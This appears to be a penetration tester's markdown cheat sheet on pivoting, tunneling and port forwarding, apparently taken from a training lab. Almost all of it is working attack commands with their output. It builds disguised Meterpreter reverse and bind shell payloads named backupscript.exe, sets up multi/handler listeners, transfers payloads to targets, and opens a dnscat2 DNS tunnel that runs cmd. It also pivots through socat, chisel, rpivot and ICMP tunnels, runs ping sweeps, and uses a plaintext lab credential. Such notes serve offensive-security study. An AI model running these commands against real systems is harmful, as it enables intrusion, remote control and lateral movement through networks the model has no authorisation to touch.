* [Pivoting, Tunneling and Port forwarding](#pivoting-tunneling-and-port-forwarding)
  - [Dynamic Port Forwading with SSH and Socks Tunneling](#dynamic-port-forwading-with-ssh-and-socks-tunneling)
  - [Reverse Port Forwarding with SSH](#reverse-port-forwarding-with-ssh)
  - [Meterpreter Tunneling & Port Forwarding](#meterpreter-tunneling--port-forwarding)
  - [Socat Redirection with a REverse Shell](#socat-redirection-with-a-reverse-shell)
  - [Socat Redirection with a Bind Shell](#socat-redirection-with-a-bind-shell)
  - [SSH for Windows: plink.exe](#ssh-for-windows-plinkexe)
  - [Web Server Pivoting with Rpivot](#web-server-pivoting-with-rpivot)
  - [Port Forwarding with Windows Netsh](#web-server-pivoting-with-rpivot)
  - [DNS Tunneling with Dnscat2](#dns-tunneling-with-dnscat2)
  - [SOCKS5 Tunneling with Chisel](#socks5-tunneling-with-chisel)
  - [ICMP Tunneling with SOCKS](#icmp--tunneling-with-socks)
  - 


# Pivoting, Tunneling and Port forwarding
## Dynamic Port Forwading with SSH and Socks Tunneling
### Executing the local Port Forward
```
ssh -L <local port>:<Victim Ip>:<Remote Port> user@<machine-IP>
```
### Confirming Port Forward with Netstat
```
netstat -antp | grep <port-no>
```
### Confirming Port Forward with Nmap
```
nmap -v -sV -p<port-no> <machine-ip>
```
### Forwarding multiple ports
```
ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64
```
### Dynamic Port Forwarding
SSH Tunneling over Socks Proxy
```
ssh -D 9050 ubuntu@10.129.202.64
```
To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at /etc/proxychains.conf. We can add socks4 127.0.0.1 9050 to the last line if it is not already there.

## Reverse Port Forwarding with SSH
Creating a Windows Payload with msfvenom
```
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
Configuring & Starting the multi/handler
```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```
Transferring Payload to Pivot Host
```
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```
Starting Python3 Webserver on Pivot Host
```
python3 -m http.server 8123
```
Downloading Payload from Windows Target
```
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```
Using SSH -R
```
 ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```
## Meterpreter Tunneling & Port Forwarding
Creating Payload for Ubuntu Pivot Host
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```
Configuring & Starting the multi/handler
```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080
```
Execute the payload on the pivot host
Then Meterpreter Shell gets established.
Ping Sweep
```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```
Ping Sweep For Loop on Linux Pivot Hosts
```
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
Ping Sweep For Loop Using CMD
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
Ping Sweep Using PowerShell
```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```
Configuring MSF's SOCKS Proxy
```
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```
Confirming Proxy Server is Running
```
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```
Adding a Line to proxychains.conf if Needed
```
Adding a Line to proxychains.conf if Needed
```
Creating Routes with AutoRoute
```
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```
It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
```
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```
Listing Active Routes with AutoRoute
```
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```
Testing Proxy & Routing Functionality
```
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```
### Port Forwarding
Port forwarding can also be accomplished using Meterpreter's portfwd module.
Creating Local TCP Relay
```
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
Connecting to Windows Target through localhost
```
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```
Netstat Output
```
netstat -antp
```
### Meterpreter Reverse Port Forwarding
Reverse Port Forwarding Rules
```
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```
Configuring & Starting multi/handler
```
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081
```
## Socat Redirection with a REverse Shell

Startomg Socat Listener
```
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
Creating the Windows Payload
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```
Start MSF Console and Configure multi/handler
```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```
Establish meterpreter session

## Socat Redirection with a Bind Shell
Creating the Windows Payload
```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```
Starting Socat Bind Shell Listener
```
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```
Configuring & Starting the Bind multi/handler
```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```
Establish meterpreter session

## SSH for Windows: plink.exe
Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies.
Using Plink.exe
```
plink -D 9050 ubuntu@10.129.15.50
```
## SSH Pivoting with Sshuttle
Installing sshuttle
```
sudo apt-get install sshuttle
```
Running sshuttle
```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```
With this command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.
Traffic Routing through iptables Routes
```
 nmap -v -sV -p3389 172.16.5.19 -A -Pn
```
## Web Server Pivoting with Rpivot
Cloning rpivot
```
sudo git clone https://github.com/klsecservices/rpivot.git
```
Installing Python2.7
```
sudo apt-get install python2.7
```
Running server.py from the Attack Host
```
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```
Transfering rpivot to the Target
```
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```
Running client.py from Pivot Target
```
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```
Confirm Connection is Established
Then Browser the target webserver using proxychains

Connecting to a Web Server using HTTP-Proxy & NTLM Auth
```
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

## Port Forwarding with Windows Netsh
Netsh is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:

- Finding routes
- Viewing the firewall configuration
- Adding proxies
- Creating port forwarding rules

### Using Netsh.exe to Port Forward
```
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```
### Verifying Port Forward
```
C:\Windows\system32> netsh.exe interface portproxy show v4tov4
```
## DNS Tunneling with Dnscat2
### Setting Up & Using dnscat2
```
git clone https://github.com/iagox86/dnscat2.git
```
### Starting the dnscat2 server
```
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
### Cloning dnscat2-powershell to the Attack Host
```
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```
Importing dnscat2.ps1
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```
We must use the pre-shared secret (-PreSharedSecret) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.

## SOCKS5 Tunneling with Chisel
### Setting up and using Chisel
```
git clone https://github.com/jpillora/chisel.git
cd chisel
go build
```
### Transferring Chisel Binary to Pivot Host
```
scp chisel ubuntu@10.129.202.64:~/
```
### Running the Chisel Server on the Pivot Host
```
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
```
### Connecting to the Chisel Server
```
./chisel client -v 10.129.202.64:1234 socks
```
Edit and Configure proxychains.conf
### Pivoting to the DC
```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
## Chisel Reverse Pivot
### Starting the Chisel Server on our Attack Host
```
sudo ./chisel server --reverse -v -p 1234 --socks5
```
### Connecting the Chisel Client to our Attack Host
```
./chisel client -v 10.10.14.17:1234 R:socks
```
Edit and configure proxychains.conf

## ICMP  Tunneling with SOCKS 
### Setting Up & Using ptunnel-ng
```
git clone https://github.com/utoni/ptunnel-ng.git
sudo ./autogen.sh
```

### Transferring Ptunnel-ng to the Pivot Host
```
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```
### Starting the ptunnel-ng Server on the Target Host
```
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
```
### Connecting to ptunnel-ng Server from Attack Host
```
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```
### Tunneling an SSH connection through an ICMP Tunnel
```
ssh -p2222 -lubuntu 127.0.0.1
```
### Enabling Dynamic Port Forwarding over SSH
```
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```
Proxychaining through the ICMP Tunnel
```
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

## RDP and SOCKS Runneling with SocksOverRDP
We can then connect to the target using xfreerdp and copy the SocksOverRDPx64.zip file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe.
### Loading SocksOverRDP.dll using regsvr32.exe
```
C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
[SocksOverRDP-Plugin.dll](/Assets/socksoverrdpdll.png)




























